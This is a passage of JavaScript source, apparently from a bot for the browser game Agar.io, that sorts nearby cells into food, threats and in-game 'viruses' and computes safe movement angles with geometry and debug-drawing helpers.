(cell.isVirus()){return true;}              else {return false;}         }                  if (cell.isVirus() && this.compareSize(cell, blob, 1.2)) {             return true;         } else if (cell.isVirus() && cell.color.substring(3,5).toLowerCase() != ""ff"") {             return true;         }         return false;     };      this.isSplitTarget = function(that, blob, cell) {         if (that.canSplit(cell, blob)) {             return true;         }         return false;     };      this.getTimeToRemerge = function(mass){         return ((mass*0.02) + 30);     };      this.separateListBasedOnFunction = function(that, listToUse, blob) {         var foodElementList = [];         var threatList = [];         var virusList = [];         var splitTargetList = [];          var player = getPlayer();                  var mergeList = [];          Object.keys(listToUse).forEach(function(element, index) {             var isMe = that.isItMe(player, listToUse[element]);              if (!isMe) {                 if (that.isFood(blob, listToUse[element]) && listToUse[element].isNotMoving()) {                     //IT\'S FOOD!                     foodElementList.push(listToUse[element]);                                       } else if (that.isThreat(blob, listToUse[element])) {                     //IT\'S DANGER!                     threatList.push(listToUse[element]);                     mergeList.push(listToUse[element]);                 } else if (that.isVirus(blob, listToUse[element])) {                     //IT\'S VIRUS!                     virusList.push(listToUse[element]);                 }                 else if (that.isSplitTarget(that, blob, listToUse[element])) {                         drawCircle(listToUse[element].x, listToUse[element].y, listToUse[element].size + 50, 7);                         splitTargetList.push(listToUse[element]);                         //foodElementList.push(listToUse[element]);                         mergeList.push(listToUse[element]);                 }                 else {if (that.isVirus(null, listToUse[element])==false) {mergeList.push(listToUse[element]);}                     }             }/*else if(isMe && (getBlobCount(getPlayer()) > 0)){                 //Attempt to make the other cell follow the mother one                 foodElementList.push(listToUse[element]);             }*/         });          foodList = [];         for (var i = 0; i < foodElementList.length; i++) {             foodList.push([foodElementList[i].x, foodElementList[i].y, foodElementList[i].size]);         }                  //console.log(""Merglist length: "" +  mergeList.length)         //cell merging         for (var i = 0; i < mergeList.length; i++) {             for (var z = 0; z < mergeList.length; z++) {                 if (z != i && that.isMerging(mergeList[i], mergeList[z])) { //z != i &&                          //found cells that appear to be merging - if they constitute a threat add them to the theatlist                                                  //clone us a new cell                         var newThreat = {};                         var prop;                                                  for (prop in mergeList[i]) {                             newThreat[prop] = mergeList[i][prop];                         }                                                  //average distance and sum the size                         newThreat.x = (mergeList[i].x + mergeList[z].x)/2;                         newThreat.y = (mergeList[i].y + mergeList[z].y)/2;                         newThreat.size = (mergeList[i].size + mergeList[z].size);                         newThreat.nopredict = true;                         //check its a threat                         if (that.isThreat(blob, newThreat)) {                              //IT\'S DANGER!                             threatList.push(newThreat);                         }                                                               }             }         }                  return [foodList, threatList, virusList, splitTargetList];     };      this.getAll = function(blob) {         var dotList = [];         var player = getPlayer();         var interNodes = getMemoryCells();          dotList = this.separateListBasedOnFunction(this, interNodes, blob);          return dotList;     };      this.clusterFood = function(foodList, blobSize) {         var clusters = [];         var addedCluster = false;          //1: x         //2: y         //3: size or value         //4: Angle, not set here.          for (var i = 0; i < foodList.length; i++) {             for (var j = 0; j < clusters.length; j++) {                 if (this.computeInexpensiveDistance(foodList[i][0], foodList[i][1], clusters[j][0], clusters[j][1]) < blobSize * 2) {                     clusters[j][0] = (foodList[i][0] + clusters[j][0]) / 2;                     clusters[j][1] = (foodList[i][1] + clusters[j][1]) / 2;                     clusters[j][2] += foodList[i][2];                     addedCluster = true;                     break;                 }             }             if (!addedCluster) {                 clusters.push([foodList[i][0], foodList[i][1], foodList[i][2], 0]);             }             addedCluster = false;         }         return clusters;     };      this.getAngle = function(x1, y1, x2, y2) {         //Handle vertical and horizontal lines.          if (x1 == x2) {             if (y1 < y2) {                 return 271;                 //return 89;             } else {                 return 89;             }         }          return (Math.round(Math.atan2(-(y1 - y2), -(x1 - x2)) / Math.PI * 180 + 180));     };      this.slope = function(x1, y1, x2, y2) {         var m = (y1 - y2) / (x1 - x2);          return m;     };      this.slopeFromAngle = function(degree) {         if (degree == 270) {             degree = 271;         } else if (degree == 90) {             degree = 91;         }         return Math.tan((degree - 180) / 180 * Math.PI);     };      //Given two points on a line, finds the slope of a perpendicular line crossing it.     this.inverseSlope = function(x1, y1, x2, y2) {         var m = this.slope(x1, y1, x2, y2);         return (-1) / m;     };      //Given a slope and an offset, returns two points on that line.     this.pointsOnLine = function(slope, useX, useY, distance) {         var b = useY - slope * useX;         var r = Math.sqrt(1 + slope * slope);          var newX1 = (useX + (distance / r));         var newY1 = (useY + ((distance * slope) / r));         var newX2 = (useX + ((-distance) / r));         var newY2 = (useY + (((-distance) * slope) / r));          return [             [newX1, newY1],             [newX2, newY2]         ];     };      this.followAngle = function(angle, useX, useY, distance) {         var slope = this.slopeFromAngle(angle);         var coords = this.pointsOnLine(slope, useX, useY, distance);          var side = this.mod(angle - 90, 360);         if (side < 180) {             return coords[1];         } else {             return coords[0];         }     };      //Using a line formed from point a to b, tells if point c is on S side of that line.     this.isSideLine = function(a, b, c) {         if ((b[0] - a[0]) * (c[1] - a[1]) - (b[1] - a[1]) * (c[0] - a[0]) > 0) {             return true;         }         return false;     };      //angle range2 is within angle range2     //an Angle is a point and a distance between an other point [5, 40]     this.angleRangeIsWithin = function(range1, range2) {         if (range2[0] == this.mod(range2[0] + range2[1], 360)) {             return true;         }         //console.log(""r1: "" + range1[0] + "", "" + range1[1] + "" ... r2: "" + range2[0] + "", "" + range2[1]);          var distanceFrom0 = this.mod(range1[0] - range2[0], 360);         var distanceFrom1 = this.mod(range1[1] - range2[0], 360);          if (distanceFrom0 < range2[1] && distanceFrom1 < range2[1] && distanceFrom0 < distanceFrom1) {             return true;         }         return false;     };      this.angleRangeIsWithinInverted = function(range1, range2) {         var distanceFrom0 = this.mod(range1[0] - range2[0], 360);         var distanceFrom1 = this.mod(range1[1] - range2[0], 360);          if (distanceFrom0 < range2[1] && distanceFrom1 < range2[1] && distanceFrom0 > distanceFrom1) {             return true;         }         return false;     };      this.angleIsWithin = function(angle, range) {         var diff = this.mod(this.rangeToAngle(range) - angle, 360);         if (diff >= 0 && diff <= range[1]) {             return true;         }         return false;     };      this.rangeToAngle = function(range) {         return this.mod(range[0] + range[1], 360);     };      this.anglePair = function(range) {         return (range[0] + "", "" + this.rangeToAngle(range) + "" range: "" + range[1]);     };      this.computeAngleRanges = function(blob1, blob2) {         var mainAngle = this.getAngle(blob1.x, blob1.y, blob2.x, blob2.y);         var leftAngle = this.mod(mainAngle - 90, 360);         var rightAngle = this.mod(mainAngle + 90, 360);          var blob1Left = this.followAngle(leftAngle, blob1.x, blob1.y, blob1.size);         var blob1Right = this.followAngle(rightAngle, blob1.x, blob1.y, blob1.size);          var blob2Left = this.followAngle(rightAngle, blob2.x, blob2.y, blob2.size);         var blob2Right = this.followAngle(leftAngle, blob2.x, blob2.y, blob2.size);          var blob1AngleLeft = this.getAngle(blob2.x, blob2.y, blob1Left[0], blob1Left[1]);         var blob1AngleRight = this.getAngle(blob2.x, blob2.y, blob1Right[0], blob1Right[1]);          var blob2AngleLeft = this.getAngle(blob1.x, blob1.y, blob2Left[0], blob2Left[1]);         var blob2AngleRight = this.getAngle(blob1.x, blob1.y, blob2Right[0], blob2Right[1]);          var blob1Range = this.mod(blob1AngleRight - blob1AngleLeft, 360);         var blob2Range = this.mod(blob2AngleRight - blob2AngleLeft, 360);          var tempLine = this.followAngle(blob2AngleLeft, blob2Left[0], blob2Left[1], 400);         //drawLine(blob2Left[0], blob2Left[1], tempLine[0], tempLine[1], 0);          if ((blob1Range / blob2Range) > 1) {             drawPoint(blob1Left[0], blob1Left[1], 3, """");             drawPoint(blob1Right[0], blob1Right[1], 3, """");             drawPoint(blob1.x, blob1.y, 3, """" + blob1Range + "", "" + blob2Range + "" R: "" + (Math.round((blob1Range / blob2Range) * 1000) / 1000));         }          //drawPoint(blob2.x, blob2.y, 3, """" + blob1Range);     };      this.debugAngle = function(angle, text) {         var player = getPlayer();         var line1 = this.followAngle(angle, player[0].x, player[0].y, 300);         drawLine(player[0].x, player[0].y, line1[0], line1[1], 5);         drawPoint(line1[0], line1[1], 5, """" + text);     };      //TODO: Don\'t let this function do the radius math.     this.getEdgeLinesFromPoint = function(blob1, blob2, radius) {         var px = blob1.x;         var py = blob1.y;          var cx = blob2.x;         var cy = blob2.y;          //var radius = blob2.size;          /*if (blob2.isVirus()) {             radius = blob1.size;         } else if(canSplit(blob1, blob2)) {             radius += splitDistance;         } else {             radius += blob1.size * 2;         }*/          var shouldInvert = false;          var tempRadius = this.computeDistance(px, py, cx, cy);         if (tempRadius <= radius) {             radius = tempRadius - 5;             shouldInvert = true;         }          var dx = cx - px;         var dy = cy - py;         var dd = Math.sqrt(dx * dx + dy * dy);         var a = Math.asin(radius / dd);         var b = Math.atan2(dy, dx);          var t = b - a;         var ta = {             x: radius * Math.sin(t),             y: radius * -Math.cos(t)         };          t = b + a;         var tb = {             x: radius * -Math.sin(t),             y: radius * Math.cos(t)         };          var angleLeft = this.getAngle(cx + ta.x, cy + ta.y, px, py);         var angleRight = this.getAngle(cx + tb.x, cy + tb.y, px, py);         var angleDistance = this.mod(angleRight - angleLeft, 360);          /*if (shouldInvert) {             var temp = angleLeft;             angleLeft = this.mod(angleRight + 180, 360);             angleRight = this.mod(temp + 180, 360);             angleDistance = this.mod(angleRight - angleLeft, 360);         }*/          return [angleLeft, angleDistance, [cx + tb.x, cy + tb.y],             [cx + ta.x, cy + ta.y]         ];     };      this.invertAngle = function(range) { // Where are you getting all of these vars from? (badAngles and angle)         var angle1 = this.rangeToAngle(badAngles[i]);         var angle2 = this.mod(badAngles[i][0] - angle, 360);         return [angle1, angle2];     },      this.addWall = function(listToUse, blob) {         //var mapSizeX = Math.abs(f.getMapStartX - f.getMapEndX);         //var mapSizeY = Math.abs(f.getMapStartY - f.getMapEndY);         //var distanceFromWallX = mapSizeX/3;         //var distanceFromWallY = mapSizeY/3;         var distanceFromWallY = 2000;         var distanceFromWallX = 2000;         if (blob.x < getMapStartX() + distanceFromWallX) {             //LEFT             //console.log(""Left"");             listToUse.push([                 [115, true],                 [245, false], this.computeInexpensiveDistance(getMapStartX(), blob.y, blob.x, blob.y)             ]);             var lineLeft = this.followAngle(115, blob.x, blob.y, 190 + blob.size);             var lineRight = this.followAngle(245, blob.x, blob.y, 190 + blob.size);             drawLine(blob.x, blob.y, lineLeft[0], lineLeft[1], 5);             drawLine(blob.x, blob.y, lineRight[0], lineRight[1], 5);             drawArc(lineLeft[0], lineLeft[1], lineRight[0], lineRight[1], blob.x, blob.y, 5);         }         if (blob.y < getMapStartY() + distanceFromWallY) {             //TOP             //console.log(""TOP"");             listToUse.push([                 [205, true],                 [335, false], this.computeInexpensiveDistance(blob.x, getMapStartY(), blob.x, blob.y)             ]);             var lineLeft = this.followAngle(205, blob.x, blob.y, 190 + blob.size);             var lineRight = this.followAngle(335, blob.x, blob.y, 190 + blob.size);             drawLine(blob.x, blob.y, lineLeft[0], lineLeft[1], 5);             drawLine(blob.x, blob.y, lineRight[0], lineRight[1], 5);             drawArc(lineLeft[0], lineLeft[1], lineRight[0], lineRight[1], blob.x, blob.y, 5);         }         if (blob.x > getMapEndX() - distanceFromWallX) {             //RIGHT             //console.log(""RIGHT"");             listToUse.push([                 [295, true],                 [65, false], this.computeInexpensiveDistance(getMapEndX(), blob.y, blob.x, blob.y)             ]);             var lineLeft = this.followAngle(295, blob.x, blob.y, 190 + blob.size);             var lineRight = this.followAngle(65, blob.x, blob.y, 190 + blob.size);             drawLine(blob.x, blob.y, lineLeft[0], lineLeft[1], 5);             drawLine(blob.x, blob.y, lineRight[0], lineRight[1], 5);             drawArc(lineLeft[0], lineLeft[1], lineRight[0], lineRight[1], blob.x, blob.y, 5);         }         if (blob.y > getMapEndY() - distanceFromWallY) {             //BOTTOM             //console.log(""BOTTOM"");             listToUse.push([                 [25, true],                 [155, false], this.computeInexpensiveDistance(blob.x, getMapEndY(), blob.x, blob.y)             ]);             var lineLeft = this.followAngle(25, blob.x, blob.y, 190 + blob.size);             var lineRight = this.followAngle(155, blob.x, blob.y, 190 + blob.size);             drawLine(blob.x, blob.y, lineLeft[0], lineLeft[1], 5);             drawLine(blob.x, blob.y, lineRight[0], lineRight[1], 5);             drawArc(lineLeft[0], lineLeft[1], lineRight[0], lineRight[1], blob.x, blob.y, 5);         }         return listToUse;     };      //listToUse contains angles in the form of [angle, boolean].     //boolean is true when the range is starting. False when it\'s ending.     //range = [[angle1, true], [angle2, false]]      this.getAngleIndex = function(listToUse, angle) {         if (listToUse.length === 0) {             return 0;         }          for (var i = 0; i < listToUse.length; i++) {             if (angle <= listToUse[i][0]) {                 return i;             }         }          return listToUse.length;     };      this.addAngle = function(listToUse, range) {         //#1 Find first open element         //#2 Try to add range1 to the list. If it is within other range, don\'t add it, set a boolean.         //#3 Try to add range2 to the list. If it is withing other range, don\'t add it, set a boolean.          //TODO: Only add the new range at the end after the right stuff has been removed.          var newListToUse = listToUse.slice();          var startIndex = 1;          if (newListToUse.length > 0 && !newListToUse[0][1]) {             startIndex = 0;         }          var startMark = this.getAngleIndex(newListToUse, range[0][0]);         var startBool = this.mod(startMark, 2) != startIndex;          var endMark = this.getAngleIndex(newListToUse, range[1][0]);         var endBool = this.mod(endMark, 2) != startIndex;          var removeList = [];          if (startMark != endMark) {             //Note: If there is still an error, this would be it.             var biggerList = 0;             if (endMark == newListToUse.length) {                 biggerList = 1;             }              for (var i = startMark; i < startMark + this.mod(endMark - startMark, newListToUse.length + biggerList); i++) {                 removeList.push(this.mod(i, newListToUse.length));             }         } else if (startMark < newListToUse.length && endMark < newListToUse.length) {             var startDist = this.mod(newListToUse[startMark][0] - range[0][0], 360);             var endDist = this.mod(newListToUse[endMark][0] - range[1][0], 360);              if (startDist < endDist) {                 for (var i = 0; i < newListToUse.length; i++) {                     removeList.push(i);                 }             }         }          removeList.sort(function(a, b){return b-a;});          for (var i = 0; i < removeList.length; i++) {             newListToUse.splice(removeList[i], 1);         }          if (startBool) {             newListToUse.splice(this.getAngleIndex(newListToUse, range[0][0]), 0, range[0]);         }         if (endBool) {             newListToUse.splice(this.getAngleIndex(newListToUse, range[1][0]), 0, range[1]);         }          return newListToUse;     };      this.getAngleRange = function(blob1, blob2, index, radius) {         var angleStuff = this.getEdgeLinesFromPoint(blob1, blob2, radius);          var leftAngle = angleStuff[0];         var rightAngle = this.rangeToAngle(angleStuff);         var difference = angleStuff[1];          drawPoint(angleStuff[2][0], angleStuff[2][1], 3, """");         drawPoint(angleStuff[3][0], angleStuff[3][1], 3, """");          //console.log(""Adding badAngles: "" + leftAngle + "", "" + rightAngle + "" diff: "" + difference);          var lineLeft = this.followAngle(leftAngle, blob1.x, blob1.y, 150 + blob1.size - index * 10);         var lineRight = this.followAngle(rightAngle, blob1.x, blob1.y, 150 + blob1.size - index * 10);          if (blob2.isVirus()) {             drawLine(blob1.x, blob1.y, lineLeft[0], lineLeft[1], 6);             drawLine(blob1.x, blob1.y, lineRight[0], lineRight[1], 6);             drawArc(lineLeft[0], lineLeft[1], lineRight[0], lineRight[1], blob1.x, blob1.y, 6);         } else if(getCells().hasOwnProperty(blob2.id)) {             drawLine(blob1.x, blob1.y, lineLeft[0], lineLeft[1], 0);             drawLine(blob1.x, blob1.y, lineRight[0], lineRight[1], 0);             drawArc(lineLeft[0], lineLeft[1], lineRight[0], lineRight[1], blob1.x, blob1.y, 0);         } else {             drawLine(blob1.x, blob1.y, lineLeft[0], lineLeft[1], 3);             drawLine(blob1.x, blob1.y, lineRight[0], lineRight[1], 3);             drawArc(lineLeft[0], lineLeft[1], lineRight[0], lineRight[1], blob1.x, blob1.y, 3);         }          return [leftAngle, difference];     };      //Given a list of conditions, shift the angle to the closest available spot respecting the range given.     this.shiftAngle = function(listToUse, angle, range) {         //TODO: shiftAngle needs to respect the range! DONE?         for (var i = 0; i < listToUse.length; i++) {             if (this.angleIsWithin(angle, listToUse[i])) {                 //console.log(""Shifting needed!"");                  var angle1 = listToUse[i][0];                 var angle2 = this.rangeToAngle(listToUse[i]);                  var dist1 = this.mod(angle - angle1, 360);                 var dist2 = this.mod(angle2 - angle, 360);                  if (dist1 < dist2) {                     if (this.angleIsWithin(angle1, range)) {                         return angle1;                     } else {                         return angle2;                     }                 } else {                     if (this.angleIsWithin(angle2, range)) {                         return angle2;                     } else {                         return angle1;                     }                 }             }         }         //console.log(""No Shifting Was needed!"");         return angle;     };      /**      * This is the main bot logic. This is called quite often.      * @return A 2 dimensional array with coordinates for every cells.  [[x, y], [x, y]]      */     this.mainLoop = function() {         var player = getPlayer();         var interNodes = getMemoryCells();          if ( /*!toggle*/ 1) {             //The following code converts the mouse position into an             //absolute game coordinate.             var useMouseX = screenToGameX(getMouseX());             var useMouseY = screenToGameY(getMouseY());             tempPoint = [useMouseX, useMouseY, 1];              //The current destination that the cells were going towards.             var tempMoveX = getPointX();             var tempMoveY = getPointY();              drawLine(getX() - (1920 / 2) / getZoomlessRatio(), getY() - (1080 / 2) / getZoomlessRatio(), getX() + (1920 / 2) / getZoomlessRatio(), getY() - (1080 / 2) / getZoomlessRatio(), 7);             drawLine(getX() - (1920 / 2) / getZoomlessRatio(), getY() + (1080 / 2) / getZoomlessRatio(), getX() + (1920 / 2) / getZoomlessRatio(), getY() + (1080 / 2) / getZoomlessRatio(), 7);             drawLine(getX() - (1920 / 2) / getZoomlessRatio(), getY() - (1080 / 2) / getZoomlessRatio(), getX() - (1920 / 2) / getZoomlessRatio(), getY() + (1080 / 2) / getZoomlessRatio(), 7);             drawLine(getX() + (1920 / 2) / getZoomlessRatio(), getY() - (1080 / 2) / getZoomlessRatio(), getX() + (1920 / 2) / getZoomlessRatio(), getY() + (1080 / 2) / getZoomlessRatio(), 7);              //This variable will be returned at the end.             //It will contain the destination choices for all the cells.             //BTW!!! ERROR ERROR ABORT MISSION!!!!!!! READ BELOW -----------             //             //SINCE IT\'S STUPID NOW TO ASK EACH CELL WHERE THEY WANT TO GO,             //THE BOT SHOULD SIMPLY PICK ONE AND THAT\'S IT, I MEAN WTF....             var destinationChoices = []; //destination, size, danger              //Just to make sure the player is alive.             if (player.length > 0) {                  //Loop through all the player\'s cells.                 for (var k = 0; k < player.length; k++) {                     if (true) {                         drawPoint(player[k].x, player[k].y + player[k].size, 0, """" + (getLastUpdate() - player[k].birth) + "" / "" + (30000 + (player[k].birthMass * 57) - (getLastUpdate() - player[k].birth)) + "" / "" + player[k].birthMass);                     }                 }                   //Loops only for one cell for now.                 for (var k = 0; /*k < player.length*/ k < 1; k++) {                      //console.log(""Working on blob: "" + k);                      drawCircle(player[k].x, player[k].y, player[k].size + this.splitDistance, 5);                     //drawPoint(player[0].x, player[0].y - player[0].size, 3, """" + Math.floor(player[0].x) + "", "" + Math.floor(player[0].y));                      //var allDots = processEverything(interNodes);                      //loop through everything that is on the screen and                     //separate everything in it\'s own category.                     var allIsAll = this.getAll(player[k]);                      //The food stored in element 0 of allIsAll                     var allPossibleFood = allIsAll[0];                     //The threats are stored in element 1 of allIsAll                     var allPossibleThreats = allIsAll[1];                     //The viruses are stored in element 2 of allIsAll                     var allPossibleViruses = allIsAll[2];                      //The bot works by removing angles in which it is too                     //dangerous to travel towards to.                     var badAngles = [];                     var obstacleList = [];                      var isSafeSpot = true;                     var isMouseSafe = true;                      var clusterAllFood = this.clusterFood(allPossibleFood, player[k].size);                      //console.log(""Looking for enemies!"");                      //Loop through all the cells that were identified as threats.                     for (var i = 0; i < allPossibleThreats.length; i++) {                          var enemyDistance = this.computeDistance(allPossibleThreats[i].x, allPossibleThreats[i].y, player[k].x, player[k].y, allPossibleThreats[i].size);                          allPossibleThreats[i].enemyDist = enemyDistance;                     }                      /*allPossibleThreats.sort(function(a, b){                         return a.enemyDist-b.enemyDist;                     })*/                      for (var i = 0; i < allPossibleThreats.length; i++) {                          var enemyDistance = this.computeDistance(allPossibleThreats[i].x, allPossibleThreats[i].y, player[k].x, player[k].y);                          var splitDangerDistance = allPossibleThreats[i].size + this.splitDistance + 150;                          var normalDangerDistance = allPossibleThreats[i].size + 150;                          var shiftDistance = player[k].size;                          //console.log(""Found distance."");                          var enemyCanSplit = this.canSplit(player[k], allPossibleThreats[i]);                         var secureDistance = (enemyCanSplit ? splitDangerDistance : normalDangerDistance);                                                  for (var j = clusterAllFood.length - 1; j >= 0 ; j--) {                             if (this.computeDistance(allPossibleThreats[i].x, allPossibleThreats[i].y, clusterAllFood[j][0], clusterAllFood[j][1]) < secureDistance + shiftDistance)                                 clusterAllFood.splice(j, 1);                         }                          //console.log(""Removed some food."");                          if (enemyCanSplit) {                             drawCircle(allPossibleThreats[i].x, allPossibleThreats[i].y, splitDangerDistance, 0);                             drawCircle(allPossibleThreats[i].x, allPossibleThreats[i].y, splitDangerDistance + shiftDistance, 6);                         } else {                             drawCircle(allPossibleThreats[i].x, allPossibleThreats[i].y, normalDangerDistance, 3);                             drawCircle(allPossibleThreats[i].x, allPossibleThreats[i].y, normalDangerDistance + shiftDistance, 6);                         }                          if (allPossibleThreats[i].danger && getLastUpdate() - allPossibleThreats[i].dangerTimeOut > 1000) {                              allPossibleThreats[i].danger = false;                         }                          /*if ((enemyCanSplit && enemyDistance < splitDangerDistance) ||                             (!enemyCanSplit && enemyDistance < normalDangerDistance)) {                              allPossibleThreats[i].danger = true;                             allPossibleThreats[i].dangerTimeOut = f.getLastUpdate();                         }*/                          //console.log(""Figured out who was important."");                          if ((enemyCanSplit && enemyDistance < splitDangerDistance) || (enemyCanSplit && allPossibleThreats[i].danger)) {                              badAngles.push(this.getAngleRange(player[k], allPossibleThreats[i], i, splitDangerDistance).concat(allPossibleThreats[i].enemyDist));                          } else if ((!enemyCanSplit && enemyDistance < normalDangerDistance) || (!enemyCanSplit && allPossibleThreats[i].danger)) {                              badAngles.push(this.getAngleRange(player[k], allPossibleThreats[i], i, normalDangerDistance).concat(allPossibleThreats[i].enemyDist));                          } else if (enemyCanSplit && enemyDistance < splitDangerDistance + shiftDistance) {                             var tempOb = this.getAngleRange(player[k], allPossibleThreats[i], i, splitDangerDistance + shiftDistance);                             var angle1 = tempOb[0];                             var angle2 = this.rangeToAngle(tempOb);                              obstacleList.push([[angle1, true], [angle2, false]]);                         } else if (!enemyCanSplit && enemyDistance < normalDangerDistance + shiftDistance) {                             var tempOb = this.getAngleRange(player[k], allPossibleThreats[i], i, normalDangerDistance + shiftDistance);                             var angle1 = tempOb[0];                             var angle2 = this.rangeToAngle(tempOb);                              obstacleList.push([[angle1, true], [angle2, false]]);                         }                         //console.log(""Done with enemy: "" + i);                     }                      //console.log(""Done looking for enemies!"");                      var goodAngles = [];                     var stupidList = [];                      for (var i = 0; i < allPossibleViruses.length; i++) {                         if (player[k].size < allPossibleViruses[i].size) {                             drawCircle(allPossibleViruses[i].x, allPossibleViruses[i].y, allPossibleViruses[i].size + 10, 3);                             drawCircle(allPossibleViruses[i].x, allPossibleViruses[i].y, allPossibleViruses[i].size * 2, 6);                          } else {                             drawCircle(allPossibleViruses[i].x, allPossibleViruses[i].y, player[k].size + 50, 3);                             drawCircle(allPossibleViruses[i].x, allPossibleViruses[i].y, player[k].size * 2, 6);                         }                     }                      for (var i = 0; i < allPossibleViruses.length; i++) {                         var virusDistance = this.computeDistance(allPossibleViruses[i].x, allPossibleViruses[i].y, player[k].x, player[k].y);                         if (player[k].size < allPossibleViruses[i].size) {                             if (virusDistance < (allPossibleViruses[i].size * 2)) {                                 var tempOb = this.getAngleRange(player[k], allPossibleViruses[i], i, allPossibleViruses[i].size + 10);                                 var angle1 = tempOb[0];                                 var angle2 = this.rangeToAngle(tempOb);                                 obstacleList.push([[angle1, true], [angle2, false]]);                             }                         } else {                             if (virusDistance < (player[k].size * 2)) {                                 var tempOb = this.getAngleRange(player[k], allPossibleViruses[i], i, player[k].size + 50);                                 var angle1 = tempOb[0];                                 var angle2 = this.rangeToAngle(tempOb);                                 obstacleList.push([[angle1, true], [angle2, false]]);                             }                         }                     }                      if (badAngles.length > 0) {                         //NOTE: This is only bandaid wall code. It\'s not the best way to do it.                         stupidList = this.addWall(stupidList, player[k]);                     }                      for (var i = 0; i < badAngles.length; i++) {                         var angle1 = badAngles[i][0];                         var angle2 = this.rangeToAngle(badAngles[i]);                         stupidList.push([[angle1, true], [angle2, false], badAngles[i][2]]);                     }                      //stupidList.push([[45, true], [135, false]]);                     //stupidList.push([[10, true], [200, false]]);                      stupidList.sort(function(a, b){                         //console.log(""Distance: "" + a[2] + "", "" + b[2]);                         return a[2]-b[2];                     });                      //console.log(""Added random noob stuff."");                      var sortedInterList = [];                     var sortedObList = [];                      for (var i = 0; i < stupidList.length; i++) {                         //console.log(""Adding to sorted: "" + stupidList[i][0][0] + "", "" + stupidList[i][1][0]);                         var tempList = this.addAngle(sortedInterList, stupidList[i]);                          if (tempList.length === 0) {                             console.log(""MAYDAY IT\'S HAPPENING!"");                             break;                         } else {                             sortedInterList = tempList;                         }                     }                      for (var i = 0; i < obstacleList.length; i++) {                         sortedObList = this.addAngle(sortedObList, obstacleList[i]);                          if (sortedObList.length === 0) {                             break;                         }                     }                      var offsetI = 0;                     var obOffsetI = 1;                      if (sortedInterList.length > 0 && sortedInterList[0][1]) {                         offsetI = 1;                     }                     if (sortedObList.length > 0 && sortedObList[0][1]) {                         obOffsetI = 0;                     }                      var goodAngles = [];                     var obstacleAngles = [];                      for (var i = 0; i < sortedInterList.length; i += 2) {                         var angle1 = sortedInterList[this.mod(i + offsetI, sortedInterList.length)][0];                         var angle2 = sortedInterList[this.mod(i + 1 + offsetI, sortedInterList.length)][0];                         var diff = this.mod(angle2 - angle1, 360);                         goodAngles.push([angle1, diff]);                     }                      for (var i = 0; i < sortedObList.length; i += 2) {                         var angle1 = sortedObList[this.mod(i + obOffsetI, sortedObList.length)][0];                         var angle2 = sortedObList[this.mod(i + 1 + obOffsetI, sortedObList.length)][0];                         var diff = this.mod(angle2 - angle1, 360);                         obstacleAngles.push([angle1, diff]);                     }                      for (var i = 0; i < goodAngles.length; i++) {                         var line1 = this.followAngle(goodAngles[i][0], player[k].x, player[k].y, 100 + player[k].size);                         var line2 = this.followAngle(this.mod(goodAngles[i][0] + goodAngles[i][1], 360), player[k].x, player[k].y, 100 + player[k].size);                         drawLine(player[k].x, player[k].y, line1[0], line1[1], 1);                         drawLine(player[k].x, player[k].y, line2[0], line2[1], 1);                          drawArc(line1[0], line1[1], line2[0], line2[1], player[k].x, player[k].y, 1);                          //drawPoint(player[0].x, player[0].y, 2, """");                          drawPoint(line1[0], line1[1], 0, """" + i + "": 0"");                         drawPoint(line2[0], line2[1], 0, """" + i + "": 1"");                     }                      for (var i = 0; i < obstacleAngles.length; i++) {                         var line1 = this.followAngle(obstacleAngles[i][0], player[k].x, player[k].y, 50 + player[k].size);                         var line2 = this.followAngle(this.mod(obstacleAngles[i][0] + obstacleAngles[i][1], 360), player[k].x, player[k].y, 50 + player[k].size);                         drawLine(player[k].x, player[k].y, line1[0], line1[1], 6);                         drawLine(player[k].x, player[k].y, line2[0], line2[1], 6);                          drawArc(line1[0], line1[1], line2[0], line2[1], player[k].x, player[k].y, 6);                          //drawPoint(player[0].x, player[0].y, 2, """");                          drawPoint(line1[0], line1[1], 0, """" + i + "": 0"");                         drawPoint(line2[0], line2[1], 0, """" + i + "": 1"");                     }                      if (this.toggleFollow && goodAngles.length === 0) {                         //This is the follow the mouse mode                         var distance = this.computeDistance(player[k].x, player[k].y, tempPoint[0], tempPoint[1]);                          var shiftedAngle = this.shiftAngle(obstacleAngles, this.getAngle(tempPoint[0], tempPoint[1], player[k].x, player[k].y), [0, 360]);                          var destination = this.followAngle(shiftedAngle, player[k].x, player[k].y, distance);                          destinationChoices = destination;                         drawLine(player[k].x, player[k].y, destination[0], destination[1], 1);                         //tempMoveX = destination[0];                         //tempMoveY = destination[1];                      } else if (goodAngles.length > 0) {                         var bIndex = goodAngles[0];                         var biggest = goodAngles[0][1];                         for (var i = 1; i < goodAngles.length; i++) {                             var size = goodAngles[i][1];                             if (size > biggest) {                                 biggest = size;                                 bIndex = goodAngles[i];                             }                         }                         var perfectAngle = this.mod(bIndex[0] + bIndex[1] / 2, 360);                          perfectAngle = this.shiftAngle(obstacleAngles, perfectAngle, bIndex);                          var line1 = this.followAngle(perfectAngle, player[k].x, player[k].y, verticalDistance());                          destinationChoices = line1;                         drawLine(player[k].x, player[k].y, line1[0], line1[1], 7);                         //tempMoveX = line1[0];                         //tempMoveY = line1[1];                     } else if (badAngles.length > 0 && goodAngles.length === 0) {                         //When there are enemies around but no good angles                         //You\'re likely screwed. (This should never happen.)                          console.log(""Failed"");                         destinationChoices = [tempMoveX, tempMoveY];                         /*var angleWeights = [] //Put weights on the angles according to enemy distance                         for (var i = 0; i < allPossibleThreats.length; i++){                             var dist = this.computeDistance(player[k].x, player[k].y, allPossibleThreats[i].x, allPossibleThreats[i].y);                             var angle = this.getAngle(allPossibleThreats[i].x, allPossibleThreats[i].y, player[k].x, player[k].y);                             angleWeights.push([angle,dist]);                         }                         var maxDist = 0;                         var finalAngle = 0;                         for (var i = 0; i < angleWeights.length; i++){                             if (angleWeights[i][1] > maxDist){                                 maxDist = angleWeights[i][1];                                 finalAngle = this.mod(angleWeights[i][0] + 180, 360);                             }                         }                         var line1 = this.followAngle(finalAngle,player[k].x,player[k].y,f.verticalDistance());                         drawLine(player[k].x, player[k].y, line1[0], line1[1], 2);                         destinationChoices.push(line1);*/                     } else if (clusterAllFood.length > 0) {                         for (var i = 0; i < clusterAllFood.length; i++) {                             //console.log(""mefore: "" + clusterAllFood[i][2]);                             //This is the cost function. Higher is better.                                  var clusterAngle = this.getAngle(clusterAllFood[i][0], clusterAllFood[i][1], player[k].x, player[k].y);                                  clusterAllFood[i][2] = clusterAllFood[i][2] * 6 - this.computeDistance(clusterAllFood[i][0], clusterAllFood[i][1], player[k].x, player[k].y);                                 //console.log(""Current Value: "" + clusterAllFood[i][2]);                           